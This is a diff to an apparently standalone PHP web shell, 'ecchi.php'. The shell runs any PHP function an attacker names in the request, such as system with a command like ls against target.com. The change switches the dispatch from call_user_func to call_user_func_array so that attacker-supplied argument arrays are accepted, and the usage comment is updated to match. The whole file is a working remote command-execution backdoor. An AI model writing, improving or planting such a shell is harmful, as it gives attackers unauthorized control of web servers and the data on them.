@@ -1,6 +1,6 @@
 <?php
 /*
-    Usage : http://target.com/ecchi.php?a=system&ecchi=ls
+    Usage : http://target.com/ecchi.php?a=system&ecchi[]=ls
 */
 
 $upp  = range('A', 'Z');
@@ -21,6 +21,6 @@ if (!isset($g[$low[0]])) {
     if (in_array($g[$low[0]], $exp)) {
         echo "Function Is Disable";
     } else {
-        call_user_func($g[$low[0]], $g[$p]);
+        call_user_func_array($g[$low[0]], $g[$p]);
     }
 }
